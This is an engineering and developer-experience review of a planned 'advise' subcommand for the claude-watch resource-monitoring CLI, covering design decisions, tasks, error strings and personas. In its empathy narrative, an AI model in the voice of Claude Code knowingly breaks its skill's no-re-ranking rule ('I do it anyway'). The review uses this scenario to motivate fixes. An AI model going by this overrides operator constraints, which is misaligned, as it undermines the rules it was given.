| test harness (`ok`/`bad`/`expect_exit`/`expect_json`) | `tests/smoke.sh:18-38` | **reused** by every fixture ✓ |
| `chmod +x` install list | `install.sh:20` | **extended** by U4 ✓ |
| self-locating `REPO_DIR` through the symlink chain | `claude-watch:17-22` | **must be reused** by U2 to source `tools/advise*.sh` — `$0` is the symlink in `~/.local/bin` |
| physical RAM + swap cap already fetched | `sample.sh:73` (`total` **unused**), `:83-85` (swap `used` only) | **not used** — E-F5 requires it |

Reuse is strong. The one genuine rebuild (U3's aggregator) is a deliberate,
argued decision, and the one accidental one (interval derivation, three copies) is
closed by E-F4.

## E9. Worktree parallelisation

| Step | Modules touched | Depends on |
|---|---|---|
| U1 sampler | `tools/sample.sh` | — |
| U4 disk scanner | `tools/disk-scan.sh`, `install.sh` | — |
| U0 aggregation | `claude-watch` (`report()` END) | golden fixture (E-D3), no PR edge |
| U2 keystone | `tools/advise.sh`, `claude-watch` (usage + dispatch), `tests/` | U0 |
| U3 cpu/mem | `tools/advise-cpumem.sh` | U2 contract, U1 schema |
| U5 disk analyzer | `tools/advise-disk.sh` | §3c contract only |
| U6 leaks | `tools/advise-leaks.sh` | §3b contract only |
| U7 docs | `README.md`, `skills/`, `docs/` | all |

```
Lane A: U1                (independent — tools/sample.sh, sole owner)
Lane B: U4                (independent — tools/disk-scan.sh + install.sh:20)
Lane C: U0 → U2 → { U3 | U5 | U6 } → U7        (shared: claude-watch, tools/advise*)
```
Launch A + B + C-head in parallel. U0 and U2 both edit `claude-watch` but in
disjoint hunks ~700 lines apart (`report()`'s END vs the dispatch `case` at
:1367-1387) — **flagged, sequential within Lane C anyway**. U3/U5/U6 fan out after
U2. U7 strictly last: `skills/` is symlinked by `install.sh:29-40`, so SKILL.md
goes live the instant it is written, against whatever `claude-watch` is on PATH.
**5 lanes considered, 3 real: 2 fully parallel, 1 sequential chain of 4.**

---

## E10. Decision audit trail

| # | decision | kind | call | why |
|---|---|---|---|---|
| E-D1 | Scope reduction (8 units → fewer) | mechanical | **rejected** | Complexity check triggers, but the split is what enables the fan-out; consolidating serialises 5 units to save a `source` |
| E-D2 | Pin the median rank + numeric bucket walk (E-F1) | mechanical | **required in U0** | `iv` scales every downstream number; the natural implementation is wrong for even `dn` |
| E-D3 | U0 carries its own golden `report --json` fixture | taste | **yes** | Removes the cross-PR merge edge and covers the three fields the other PR's fixtures may not; alternative (wait for that PR) blocks U0 for no coverage gain |
| E-D4 | Per-PID cputime differencing; `session` rows stay `%cpu` (E-F2) | taste | **split basis** | Tree-cumulative loses exactly the short-lived-child burn the tool exists to catch; alternative (tree cumulative + exit flag) is more code for a still-lossy number |
| E-D5 | `cpu_seconds ≤ interval × ncpu` sanity invariant | mechanical | **add** | One comparison catches every identity-change variant of E-D4 |
| E-D6 | Extend the cpu caveat to FLOOR/TOPN + add `cpu.unexplained_load` (E-F3) | taste | **both** | A silent `cpu ok` under high load is the tool's defining failure; load average is already in the data for free |
| E-D7 | U2 exports the shared denominators (E-F4) | mechanical | **required** | Two units cannot each derive `observed_seconds` and stay consistent in one JSON document |
| E-D8 | Single-pass window read | taste | **yes** | Halves the month cost and deletes the duplicate derivation; alternative (tee to two awks) keeps both copies |
| E-D9 | U1 records `memsize_kb` + `swap_cap_mb` (E-F5) | mechanical | **required** | Three §5 thresholds are otherwise uncomputable; the values are already fetched and discarded at `sample.sh:73` |
| E-D10 | Lock owned by `disk-scan.sh`, `mkdir`+pid+trap (E-F6) | mechanical | **required** | Two units currently claim it; `touch`/`[ -f ]` is TOCTOU; an orphaned lock degrades silently forever |
| E-D11 | Deadline as an internal watchdog; `find -xdev` (E-F7) | mechanical | **required** | An in-loop check cannot preempt the blocked syscall it was written for |
| E-D12 | Era detection = NF **and** TIME-shape; add a schema marker (E-F8) | taste | **both** | NF-per-kind is right but a truncated row silently reads as old-era; the marker keeps the next schema change unambiguous |
| E-D13 | Re-`stat` before printing a removal command (E-F9) | taste | **yes** | Bounded to a handful of `stat` calls; the alternative is authoring `rm -rf` on a 6h-old verdict |
| E-D14 | Third sort key `id` (E-F10) | mechanical | **add** | One line; makes every fixture's expected output exact |
| E-D15 | `disk.volume_low`: `or` → `and` (E-F11) | taste | **change** | `or` makes every large volume permanently critical — G1's deleted failure, returning |
| E-D16 | Label reclaim totals a floor; dedupe overlapping roots (E-F12) | mechanical | **add** | Silent undercounts are the "confidently wrong" class |
| E-D17 | Analyzers sanitise before emitting (E-F14) | mechanical | **reverses §3b** | You cannot strip tabs after parsing a tab-separated stream |
| E-D18 | Pin `scan_worktrees` / `scan_orphans` shapes in §3 (E-F15) | mechanical | **add** | Two units + one in-flight PR must agree on a shape nobody wrote down |
| E-D19 | Reuse `status()`'s `age < 120` for `sampler_ok` | mechanical | **reuse** | DRY; two liveness definitions in one tool is how they drift |
| E-D20 | Drop `eps[]`/`sysseen[]` entirely in U0 | mechanical | **yes** | Constant memory; the ordering assumption already exists in `flush()` |
| E-D21 | Restate §1's month budget honestly (≤10s) | taste | **restate** | Shipping against a number the first real run misses is worse than a larger honest one |
| E-D22 | `minfree` zero bug (E-F13) | taste | **flag, don't fix** | Pre-existing, outside the diff; the memory analyzer must not copy the idiom |
| E-D23 | Correct HANDOFF §4.1's `$6` note in U7 | mechanical | **add** | U1 invalidates it; a stale gotcha re-introduces the bug it prevents |
| E-D24 | Create `TODOS.md` | mechanical | **no** | Deferrals live in HANDOFF §7 + §E7; a second backlog is worse than one |
| E-D25 | Add fixtures for the 22 diagram gaps | mechanical | **all 22** | Completeness is cheap here; every one is a bash assertion against a hand-written TSV |
| E-D26 | Add inline ASCII diagrams to 3 files (§E4) | taste | **yes** | The U0 note is what stops the next reader restoring the sort |

**26 decisions — 17 mechanical, 9 taste. Scope reduced: never. Lake score: 26/26
chose the complete option.**

---

## E11. Implementation tasks

- [ ] **T1 (P1, human: ~1h / CC: ~10min)** — U0 — pin the histogram median rank, numeric bucket walk, `iv=10` fallback
  - Surfaced by: E-F1 — `claude-watch:318-320`
  - Files: `claude-watch`, `tests/fixture-aggregation.sh`
  - Verify: fixture with even `dn` where `>=` and `>` disagree
- [ ] **T2 (P1, human: ~2h / CC: ~20min)** — U0 — golden-file `report --json` byte-diff before/after
  - Surfaced by: REGRESSION RULE — U0 changes `interval_seconds`/`observed_seconds`/`still_alive`
  - Files: `tests/fixture-aggregation.sh`, `tests/fixtures/day-golden.tsv`
  - Verify: `diff <(git stash; report --json) <(git stash pop; report --json)`
- [ ] **T3 (P1, human: ~3h / CC: ~25min)** — U3 — per-PID cputime deltas; `session` stays `%cpu`; `≤ interval × ncpu` invariant
  - Surfaced by: E-F2 — `sample.sh:118,155,174`
  - Files: `tools/advise-cpumem.sh`, `tests/fixture-cpumem.sh`
  - Verify: pid-churn fixture, mixed-era boundary fixture, invariant fixture
- [ ] **T4 (P1, human: ~1h / CC: ~10min)** — U1 — append `memsize_kb` + `swap_cap_mb` to the `sys` row
  - Surfaced by: E-F5 — `sample.sh:73` passes `total` and never uses it
  - Files: `tools/sample.sh`, `tests/fixture-sample-schema.sh`
  - Verify: field values match `sysctl -n hw.memsize` / `vm.swapusage` total
- [ ] **T5 (P1, human: ~2h / CC: ~20min)** — U2 — single-pass window read; export the six shared scalars
  - Surfaced by: E-F4 — §3b passes only `CW_WINDOW_SECONDS`
  - Files: `tools/advise.sh`, `tools/advise-cpumem.sh`, `tests/fixture-window.sh`
  - Verify: month window timed; `observed_seconds` identical top-level and per-finding
- [ ] **T6 (P1, human: ~2h / CC: ~20min)** — U4 — `mkdir` lock + pid + trap + ownership-checked stale break
  - Surfaced by: E-F6 — §1 and §6 U4 both claim the lock
  - Files: `tools/disk-scan.sh`, `tests/fixture-disk-scan.sh`, `claude-watch` (`doctor`)
  - Verify: held-lock fixture, dead-pid stale-lock fixture
- [ ] **T7 (P1, human: ~2h / CC: ~20min)** — U4 — watchdog deadline + `find -xdev`
  - Surfaced by: E-F7 — an in-loop check cannot preempt a blocked syscall
  - Files: `tools/disk-scan.sh`, `tests/fixture-disk-scan.sh`
  - Verify: fixture with a sleeping worker; `partial=1`, `deadline_hit=1`, cache written
- [ ] **T8 (P1, human: ~30min / CC: ~5min)** — U2/§3b — analyzers sanitise tabs/newlines before emitting
  - Surfaced by: E-F14 — §3b assigns stripping to the parser
  - Files: plan §3b, `tools/advise*.sh`, `tests/fixture-window.sh`
  - Verify: a finding whose path contains a literal tab
- [ ] **T9 (P2, human: ~1h / CC: ~10min)** — U3 — extend the cpu caveat to FLOOR/TOPN; add `cpu.unexplained_load`
  - Surfaced by: E-F3 — `sample.sh:13-15,172-180`
  - Files: `tools/advise-cpumem.sh`, `tests/fixture-cpumem.sh`
  - Verify: high-load, zero-proc-row fixture does not emit a bare `ok`
- [ ] **T10 (P2, human: ~1h / CC: ~10min)** — U1/U3 — era detection = NF **and** TIME shape; schema marker on the `sys` row
  - Surfaced by: E-F8
  - Files: `tools/sample.sh`, `tools/advise-cpumem.sh`, `tests/fixture-sample-schema.sh`
  - Verify: truncated-row fixture
- [ ] **T11 (P2, human: ~1h / CC: ~10min)** — U5 — re-`stat` before printing a removal command; print cache age
  - Surfaced by: E-F9
  - Files: `tools/advise-disk.sh`, `tests/fixture-disk.sh`
  - Verify: fixture where the marker is touched after the cache was written
- [ ] **T12 (P2, human: ~15min / CC: ~5min)** — U2 — `id` as the third sort key
  - Surfaced by: E-F10
  - Files: `tools/advise.sh`, `tests/fixture-window.sh`
  - Verify: two findings, equal severity and share, deterministic order
- [ ] **T13 (P2, human: ~15min / CC: ~5min)** — §5 — `disk.volume_low` `or` → `and`
  - Surfaced by: E-F11
  - Files: plan §5, `tools/advise-disk.sh`, `tests/fixture-disk.sh`
  - Verify: 4TB-volume fixture at 399GiB free is not `critical`
- [ ] **T14 (P2, human: ~45min / CC: ~10min)** — U4 — floor labelling, path dedupe, `sum(groups) <= used_kb`
  - Surfaced by: E-F12
  - Files: `tools/disk-scan.sh`, `tools/advise-disk.sh`, `tests/fixture-disk-scan.sh`
  - Verify: nested-`node_modules` fixture; `REPO_ROOTS=$HOME` overlap fixture
- [ ] **T15 (P2, human: ~30min / CC: ~5min)** — §3 — pin the `scan_worktrees` / `scan_orphans` column shapes
  - Surfaced by: E-F15 — `claude-watch:986-987`, `:445-450`
  - Files: plan §3, `tests/fixture-leaks.sh`
  - Verify: fixture asserts the live column count
- [ ] **T16 (P2, human: ~30min / CC: ~5min)** — U0 — drop `eps[]`/`sysseen[]`; constant-memory dedupe
  - Surfaced by: §E5 — ~25MB of awk hash for a month window
  - Files: `claude-watch`, `tests/fixture-aggregation.sh`
  - Verify: 60k-row fixture, peak RSS bounded
- [ ] **T17 (P2, human: ~20min / CC: ~5min)** — U2 — reuse `status()`'s `age < 120` for `sampler_ok`
  - Surfaced by: §E4 DRY #2 — `claude-watch:1297,1302`
  - Files: `claude-watch`, `tools/advise.sh`
  - Verify: dead-sampler fixture
- [ ] **T18 (P2, human: ~30min / CC: ~10min)** — U4 — temp file in `$STATE` so `mv` is atomic; report a failing `mv`
  - Surfaced by: failure mode 14 — `mktemp` defaults to another volume
  - Files: `tools/disk-scan.sh`, `tests/fixture-disk-scan.sh`
  - Verify: read-only `$STATE` fixture reports the failure
- [ ] **T19 (P2, human: ~20min / CC: ~5min)** — U2 — fixture for a failing `gzcat` → domain `partial`
  - Surfaced by: failure mode 20 — §9 names the requirement, no fixture
  - Files: `tests/fixture-window.sh`
  - Verify: planted corrupt `.tsv.gz`
- [ ] **T20 (P3, human: ~20min / CC: ~5min)** — U7 — correct HANDOFF §4.1's `$6` note; add the `df /` vs `df $HOME` gotcha
  - Surfaced by: §E4 stale diagrams
  - Files: `docs/prompts/HANDOFF.md`
  - Verify: read-through
- [ ] **T21 (P3, human: ~45min / CC: ~15min)** — inline ASCII diagrams in `advise.sh`, `disk-scan.sh`, `report()`'s END
  - Surfaced by: §E4
  - Files: as listed
  - Verify: read-through
- [ ] **T22 (P3, human: ~30min / CC: ~10min)** — §9 gains the truncated-row and missing-denominator cases
  - Surfaced by: E-F8, E-F4
  - Files: plan §9
  - Verify: each has a named fixture

---

## E12. Eng completion summary

```
+====================================================================+
|                    ENG REVIEW — claude-watch advise                 |
+====================================================================+
| Step 0: Scope Challenge   | complexity check TRIGGERED, scope NOT   |
|                           | reduced (split enables the fan-out)     |
| Architecture Review       | 5 issues (E-F2, E-F4, E-F6, E-F7, E-F14)|
| Code Quality Review       | 4 issues (3 DRY, 1 stale gotcha)        |
| Test Review               | diagram produced, 22 gaps, 2 regression |
|                           | golden-file tests made MANDATORY        |
| Performance Review        | 3 issues (2 passes, awk memory, month   |
|                           | budget); O(n²) claim reproduced: 3.97s  |
| Threshold audit           | 3 of 12 §5 thresholds uncomputable      |
| NOT in scope              | written (10 items)                      |
| What already exists       | written (14 mapped, 11 reused)          |
| Failure modes             | 24 rows, 11 CRITICAL GAPS               |
| Decision audit trail      | 26 decisions — 17 mechanical, 9 taste   |
| Implementation tasks      | 22 (8 P1, 11 P2, 3 P3)                  |
| Diagrams produced         | 2 (architecture/dependency, test surface)|
| Parallelisation           | 3 lanes — 2 parallel, 1 sequential (×4) |
| Lake Score                | 26/26 complete option chosen            |
+====================================================================+
```

**Verdict: the revised design survives contact with implementation, after eight
P1 fixes.** G1 (per-domain ranking), G2 (linear aggregation first) and G4
(separate PR) are all correct calls, and the O(n²) measurement reproduces exactly.
G3 is right about the *problem* — `man ps` does define `%cpu` as a decaying
average and `sample.sh:29` samples it — and wrong about the *remedy for session
rows*, which is E-F2 and the single most consequential finding here.

The two things that would have shipped broken and silent: the shared denominators
(`memsize_kb` and swap cap are not in the schema at all, so three §5 thresholds
compute against nothing) and the CPU floor (twenty processes at 4% produce zero
rows and a confident `cpu ok`). Both are one-unit fixes. Both are exactly the
failure class this tool exists to prevent.

**Answers to the six questions this review was asked:**
1. **Can linear aggregation reproduce `report` exactly?** Yes — epoch min/max is
   exactly equivalent, and the counting histogram is exact — *provided* the rank is
   pinned to `int(dn/2)+1` with a numeric bucket walk and the `iv=10` fallback
   survives (E-F1). Peak detection and the same-name fold are running maxima in the
   main loop and cannot diverge. `observed_seconds` diverges only through `iv`.
2. **Field-offset shift:** `$6→$7` and `i<=5→i<=6` are both correct and complete
   for `sample.sh`'s parsing — but U1's file-hunk list omits the four `print`
   statements that must emit the new field. Two-era compat for `report` is safe
   (verified: it reads `sys $4-$8`, `session $3-$7`, `proc $3-$5`, `orphan $3,$5,$6`
   and ignores trailing fields). NF detection is reliable **per kind** — `proc` and
   `orphan` both being NF=6 makes the qualifier load-bearing — with the
   truncated-row hole at E-F8.
3. **Contract sufficiency:** six under-pinned agreements — the shared denominators
   (E-F4), sanitisation ownership (E-F14), tie-break (E-F10), the lockfile (E-F6),
   `scan_*` shapes (E-F15), and zero-denominator behaviour (E-F4).
4. **Disk scanner:** lockfile mechanism unspecified and TOCTOU-prone; orphaned lock
   degrades silently forever; the deadline as specified cannot fire on the case it
   was written for; `find` misses `-xdev`; `mktemp` breaks the atomic `mv`.
5. **§5 thresholds:** `mem.holder`, `mem.swap_cap` and the memory `share_of_domain`
   cannot be computed from the current schema. Everything else can, with E-F3's
   truncation caveat on the CPU domain.
6. **Degenerate cases:** dead sampler, zero samples, over-long window and malformed
   cache are all covered ★★★. Missing: a truncated sample row and a missing shared
   denominator (the `nan` §9 forbids).

STATUS: **DONE_WITH_CONCERNS** — 11 critical failure-mode gaps, all closeable with
the 22 tasks above; 8 are P1 ship blockers.

---
---

# DX REVIEW — appended 2026-08-06

> **Folded in.** Every finding below is now in the spec above — the `primary`
> state, `measurement_state`/`measurement_reasons`, `schema_version`, the total
> severity order with `unknown` above `ok`, the one ordering rule, the error
> strings in §9, the threshold knobs and `--show-thresholds`, the
> `CLAUDE_WATCH_DISK_CACHE` rename, `disk --json`, the `status` `data_size`
> rename, the `install.sh` chmod, discoverability, and the day-count fields.
> Two are superseded by G7 rather than adopted: `--no-scan` is unnecessary
> because nothing scans implicitly, and the "30G one second after install"
> moment is now §8 open decision 5. Retained as the audit record, not as spec.

Mode: **DX POLISH**, headless with auto-decisions. Scope: §0–§9 of this plan only.
Everything from `## 0A` down was read for context and is not re-reviewed; no
strategy or architecture finding from the CEO or ENG appendices is repeated here.
Nothing above this line was edited, reordered or deleted.

Read against the real product: `claude-watch` (usage block at `claude-watch:26-53`,
colour gate at `:57-63`, `is_uint` at `:434`, the four error strings at `:750`,
`:754`, `:1102`, `:1172`, `status()` at `:1278-1309`, `doctor()` at `:1334-1369`,
dispatch at `:1382-1387`), `claude-top`, `install.sh` (chmod list line 20, skill
symlinks lines 31-47), `README.md` (`--json` contract at :160, Configuration table
at :222, Limitations at :248), `skills/claude-watch/SKILL.md`,
`skills/claude-watch-reap/SKILL.md`, `tests/smoke.sh`.

**One-line verdict.** The plan's *behaviour* under failure is unusually well
specified — every degenerate case in §9 has a named guard and a fixture. Its
*words* are not specified at all: there is not a single error string in nine
sections, and the six things that go wrong most are exactly the six the user will
meet first. That, a first run that can block for two minutes, and an agent
contract whose priority order contradicts itself are the three things worth fixing
before U2 is written.

---

## D0. Product type, personas, and what "hello world" means

**Product type:** CLI tool (primary) + Claude Code skill (secondary). Both surfaces
are in this plan and both are scored.

```
TARGET DEVELOPER PERSONA — P1 (primary)
=======================================
Who:       The tool's author and only user. Senior, macOS, lives in a terminal,
           runs many concurrent Claude Code sessions, wrote every line of this repo.
Context:   Reaches for it when the laptop is hot, the fans are loud, or a disk-full
           warning lands. Usually mid-task, usually annoyed, wants one answer.
Tolerance: Seconds, not minutes. A command that hangs with no output gets Ctrl-C'd
           and not run again that week.
Expects:   The flag conventions his own tool already uses (`--json`, `--min N`,
           `--days N`, `CLAUDE_WATCH_*`), colour only on a tty, and never to be lied
           to about what was measured.

TARGET DEVELOPER PERSONA — P2 (co-equal, non-human)
===================================================
Who:       Claude Code, invoking through skills/claude-watch/SKILL.md, parsing
           `--json`, forbidden by that skill from re-deriving severity or re-ranking.
Context:   The user asked "why is my laptop hot". The model gets one Bash call's
           worth of patience before it starts hand-rolling `ps`.
Tolerance: A tool call that takes 120s is a tool call that times out or blows the
           turn. It cannot answer a prompt, cannot see a tty, cannot retry cheaply.
Expects:   Everything needed to present a correct priority order to be IN the JSON.
           Any judgement left out of the JSON is a judgement it will improvise.
```

**"Hello world" for this product is not the install.** It is the first run of
`claude-watch advise` that prints a finding the user acts on. That distinction
drives the whole review: install is already one command and works, and the plan
cannot make it better. The first *useful* run is where the friction is.

---

## D1. Developer journey map

Traced against the actual files, not hypothetically.

| # | Stage | Developer does | Friction found | Status |
|---|---|---|---|---|
| 1 | Discover | Reads `README.md`; hits the `claude-top` frame at :17 and the `claude-watch` digest at :57 | None. The README leads with real output, names the pain in its second sentence, and explains *cores vs percent* before anything else. `advise` must be introduced the same way — a real frame first, flags second | ok |
| 2 | Install | `git clone && ./install.sh` | `install.sh:20` chmods three files; U4 adds a fourth. Existing installs upgrade by `git pull`, which does not re-run `install.sh`, and `skills/*` are symlinked so the new commands are live the instant the pull lands (**DX-7**) | fixed |
| 3 | Hello world | `claude-watch advise` | Fresh install: no samples → cpu/memory `unknown`; no cache → a synchronous 10–120s scan; leaks scans live. First impression is a hang followed by two `unknown`s (**DX-1**, **DX-19**) | fixed |
| 4 | Real usage | `advise --window week`, `disk --refresh`, `advise --json` through the skill | Priority order contradicts itself between §3d and §4 (**DX-3**); `disk --json` has no schema (**DX-5**); the worst domain can print third (**DX-6**) | fixed |
| 5 | Debug | Something says `unknown`, `partial`, or `stale` | Six failure modes, zero specified strings (**DX-2**); no `remedy` for an unmeasured domain (**DX-13**); no `partial_reason` (**DX-14**); `doctor` never learns about the new surface (**DX-10**) | fixed |
| 6 | Upgrade | `git pull` on a machine holding 30 days of pre-G3 data | `cpu_basis: "mixed"` is the entire explanation offered for a backward-incompatible schema change (**DX-8**); era detection is a field count with no version to key on (**DX-15**) | fixed |

---

## D2. Developer empathy narrative

**P1, the human, on the morning after `git pull`.**

My fans have been up for an hour and I've got a build going, so I finally run the
thing I built for this. `claude-watch advise`. Nothing happens. Not a spinner, not
a header — the cursor just sits there. I know I wrote a stderr notice somewhere
about a 120-second budget, but I'm not seeing it, and I've got a build going, so
after about eight seconds I Ctrl-C and run `claude-watch report` instead, which I
trust because it answers instantly. When I do come back and let `advise` finish, I
get a headline saying disk is critical, and then the first thing on screen under it
is a CPU section telling me CPU is fine. My eye goes there first because it's
first. The section I actually needed is two screens down. And the CPU number it
shows me is a warn at 0.25 cores — I know that's the threshold because I wrote it
down in §5 three weeks ago, but nothing on screen says so, and my instinct is to go
find the file and change the number rather than trust it. Then near the bottom:
`cpu basis: mixed`. Mixed with what? I changed the sampler yesterday, so I can
reason my way to it, but the word "mixed" on its own tells me one of my numbers is
built on something and I don't know which numbers or since when. What I wanted was
one line, in the first second, telling me the disk is at 4.7% and here are 30G I
can get back. What I got was a hang, a section ordering that buried the answer, a
threshold I can't see, and a one-word warning about my own data that I have to
decode.

**P2, the model, mid-turn.** The user asked why the laptop is hot. My skill says
relay, never re-rank. I call `claude-watch advise --json` and it takes 40 seconds —
I didn't know it might scan a disk, nothing in `allowed-tools` distinguishes the
cheap call from the expensive one. The payload has `domains` in a fixed array order
with disk third, `severity: "critical"` on disk and `"ok"` on cpu. Fixed order is
not priority order, so to present "what to fix first" I have to sort by severity —
which is re-ranking, which the skill forbids. I do it anyway, because the
alternative is reading out an `ok` first. Memory says `measured: false`,
`severity: "unknown"`, and the skill tells me not to call it clean, but gives me no
sentence to say instead, so I write one: "memory could not be determined." The user
now believes something is broken. It isn't; the window just landed in a sleep gap.

---

## D3. The eight passes

### Pass 1 — Getting Started (Zero Friction): 5/10 → 8/10 after fixes

Install is genuinely one command and the README is above average for a personal
tool. The gap is entirely in the first *run*.

**DX-1 (CRITICAL) — the first run can block for two minutes with no escape hatch.**
§1 specifies: missing cache → synchronous cold scan, one stderr notice, 120s
deadline. Measured cold scan today is 10.4s and the deadline is 120s. There is no
`--no-scan`, and a non-tty caller (the skill's Bash call, `smoke.sh`, anything in
CI) gets the same blocking scan with no way to decline it. This is the tool's
single worst DX moment and it lands on the very first invocation.

*Fix — decided:* branch on `[ -t 1 ]`, the exact test `claude-watch:57` already uses
for colour.

- tty + no cache → print the notice **before** the scan starts, on stderr, then scan.
- no tty + no cache → do **not** scan. Disk domain is `unknown` with
  `remedy: "no disk scan yet — run: claude-watch disk --refresh"`.
- `--refresh` forces a scan in either case. `--no-scan` refuses one in either case
  and is what `smoke.sh` uses.
- SKILL.md tells the model to pass `--no-scan` and to surface the remedy, never to
  trigger a scan on the user's behalf.

**DX-19 (HIGH) — a fresh install's `advise` reads as broken rather than young.**
cpu and memory are `unknown` for the first hour because the sampler has no data
yet, which is correct and looks like a fault. §9's "No samples at all (fresh
install) → `samples: 0`, cpu/memory `unknown`, exit 0" specifies the shape and not
the words.

*Fix — decided:* when `samples == 0` **and** the newest data file is younger than
one hour, the cpu and memory summaries read
`unknown — the sampler started 4m ago; CPU and memory need about an hour of samples`.
Distinguish that from a genuinely dead sampler (DX-2 row 2) by the age of the
newest file, not by the sample count.

### Pass 2 — CLI Design (Usable + Useful): 6/10 → 8/10 after fixes

The command surface is coherent: `advise` and `disk` are the same grammar as
`report`/`orphans`/`worktrees`/`status`/`doctor`, `--json` carries the same
"read-only by construction" property (README:160), and the refusal of
`--kill`/`--remove`/`--yes` with exit 2 asserted in `smoke.sh` is exactly right.

On the **name**: `advise` is a verb where `orphans`, `worktrees` and `status` are
nouns, so `advice` would technically be the more consistent choice. Keeping
`advise` anyway — the surface is already mixed (`report` and `doctor` read as both),
imperative subcommands are the dominant CLI convention, and renaming costs an edit
pass across the plan, both skills, HANDOFF and README for a coin-flip. Closing §8
open decision 6 as `advise`.

**DX-4 (HIGH) — `CW_DISK_CACHE` breaks the env-var prefix.** Every user-facing knob
in this product is `CLAUDE_WATCH_*`: seven of them, listed in `usage()` at
`claude-watch:47-52` and in README:222. §3c and U4 introduce `CW_DISK_CACHE` as a
user-respected variable, and §3b adds `CW_WINDOW_SECONDS`.

*Fix — decided (mechanical):* `CLAUDE_WATCH_DISK_CACHE` for anything a user or a
fixture sets from outside; it joins the `usage()` block and the README table. `CW_*`
stays for names passed between the parent script and its own analyzers
(`CW_WINDOW_SECONDS`) and the plan says so in one sentence, so the next reader knows
which prefix means what.

**DX-5 (HIGH) — `claude-watch disk --json` has no specified schema.** §3d specifies
`advise --json` in full and §1 introduces `disk` as "the disk facts on their own",
but nothing says what its JSON looks like. `skills/claude-watch/SKILL.md:16` states
the JSON is the contract and the human format is not; shipping a second JSON command
with no contract is the one thing that promise cannot survive.

*Fix — decided:* `disk --json` emits `{"command":"disk", "generated_at":…,
"disk_scan":{…}, "domain":{…}}` where `domain` is byte-for-byte the same object
`advise` puts in its `domains[]` for disk. One shape, one fixture, and an agent that
learned one learned both.

**DX-17 (MEDIUM) — `--window` accepts three shapes and rejects the two likeliest
typos.** `24h` (numeric+unit), `week`/`month` (words), `Nh`/`Nd` (numeric+unit).
Meanwhile the existing surface takes bare integers with the unit in the flag name
(`--min MINUTES`, `--days DAYS`, `claude-watch:745-752`). A user carrying that habit
types `--window 7` and gets exit 2; a user who learned `week` types `1w` and gets
exit 2.

*Fix — decided:* accept `Nw` alongside `Nh`/`Nd` (three-character change, kills one
of the two typos), and make the error message name every accepted form so the other
typo self-corrects on first contact (DX-2 row 1). Keep the word aliases — the user
fixed week/month selectors as settled, and `week` is more legible in a header than
`7d`.

**DX-16 (MEDIUM) — exit 1 now means three different things.** `status` returns 1
when there are no samples (`claude-watch:1289`), `doctor` returns non-zero when the
install is broken, and §6 U2 gives `advise` exit 1 for an unreadable data directory
while a *dead sampler* leaves it at 0. Each choice is individually right; together
they are undocumented.

*Fix — decided:* one exit-code table in README next to the `--json` section, and one
line in `usage()`. No behaviour change.

### Pass 3 — Error Messages (Fight Uncertainty): 4/10 → 8/10 after fixes

The lowest score in this review, and the one with the largest gap between how well
the plan thinks and what the user will actually read.

**DX-2 (CRITICAL) — nine sections, zero error strings.** §9 names ten failure modes
and specifies the *shape* of each response (`unknown`, `partial`, `stale`, capped
severities, exit codes). Not one string is written down. The three that exist in the
product today are problem + cause with no fix:
`claude-watch orphans: --min needs a non-negative integer (got "foo")`
(`claude-watch:750`) tells you the rule and the input, never the remedy. The only
error in the codebase that gets all three right is `status`'s
`no samples yet — is the launchd job loaded? try: claude-watch doctor`
(`claude-watch:1287`). That is the house style worth extending, and U2 should not be
inventing prose at implementation time.

*Fix — decided.* These six strings go in the plan, verbatim, as U2/U5's spec. Every
one is problem, then cause, then fix.

| # | Situation | Exact string | Stream / code |
|---|---|---|---|
| 1 | Invalid `--window` | `claude-watch advise: --window "3 weeks" is not a duration. Accepted: 24h, week, month, or Nh/Nw/Nd (e.g. 6h, 2w, 14d). Try: claude-watch advise --window 24h` | stderr, exit 2 |
| 2 | Dead sampler | `sampler stopped — last sample 3d4h ago. CPU and memory are unmeasured; disk and leaks below are current. Fix: claude-watch doctor` | stdout, first line, `C_RED`, exit 0 |
| 3 | Stale disk cache | `disk facts are 3d old (refreshed every 6h) — nothing has rescanned since. For current numbers: claude-watch disk --refresh (~10s, 120s cap)` | stdout, in the disk section, `C_DIM` |
| 4 | Scan deadline hit | `disk scan stopped at its 120s deadline after 12 of 40 roots — the sizes below are a floor, not a total. Narrow CLAUDE_WATCH_REPO_ROOTS, or re-run claude-watch disk --refresh when the machine is idle` | stdout, leads the disk section, `C_HOT` |
| 5 | Window longer than data | `window: month (30d requested, 2d available — the sampler has only been recording since 2026-08-04). Nothing to fix; the window widens as data accumulates` | stdout, header, `C_DIM` |
| 6 | Cold scan starting / lock lost | `no disk scan yet — scanning ~/Dev now, up to 120s. This is cached for 6h; later runs are instant.` / `another disk scan is already running — using the cached facts from 3h ago. Re-run in a minute for fresh numbers.` | stderr, before the work |

Two rules that go with them: **every one of these is suppressed on the `--json`
path** (§9 already requires it for the cold-scan notice — it applies to all six),
and the machine-readable equivalent of rows 2-5 travels as the `remedy` field
(DX-13) so the model relays the same sentence rather than composing its own.

**DX-13 (MEDIUM) — an unmeasured domain carries a prohibition but no words.** U7
tells SKILL.md "never present a domain with `measured: false` as clean". A relay
given a rule and no replacement sentence writes its own, and the one it writes is
usually scarier than the truth ("memory could not be determined" for what is
actually "the machine was asleep").

*Fix — decided:* every domain with `severity: "unknown"` carries
`"remedy": "<one sentence>"` in the JSON, and SKILL.md's instruction becomes "read
out `remedy` verbatim". The judgement lives in bash where it is fixture-testable,
which is the same argument that justified this whole feature.

**DX-14 (MEDIUM) — `partial: true` with no reason.** A domain goes partial for a
scan deadline, a permission denial, or a `.gz` that failed to decompress (§9) — three
different user actions, one indistinguishable boolean.

*Fix — decided:* `"partial_reason": "deadline" | "permissions" | "unreadable_archive"`,
and the human line names it (string 4 above is the deadline variant).

**DX-11 (MEDIUM) — severity has no colour mapping, and colour must not be the
carrier.** §6 U2 says "human renderer using the existing `C_*` colours" and stops
there. `claude-watch:57-63` blanks every colour when stdout is not a tty or
`NO_COLOR` is set — which is exactly the case for `advise | less`, `advise > file`,
and every agent invocation.

*Fix — decided:* `critical` = `C_RED`, `warn` = `C_HOT`, `info` = `C_KEY`, `ok` =
`C_OK`, `unknown` = `C_DIM` **plus the literal word `unmeasured`**. Every finding and
every section header prints its severity as a word regardless of colour. `unknown`
never renders in `C_OK`; the failure this tool exists to prevent is a green line
about something nobody measured.

### Pass 4 — Documentation (Findable + Learn by Doing): 7/10 → 9/10 after fixes

U7 is the strongest documentation unit in any of the three reviews on this file: it
covers README, both skills and HANDOFF, it points at the threshold *constants*
instead of restating §5 a third time, it anonymises paths in published examples, and
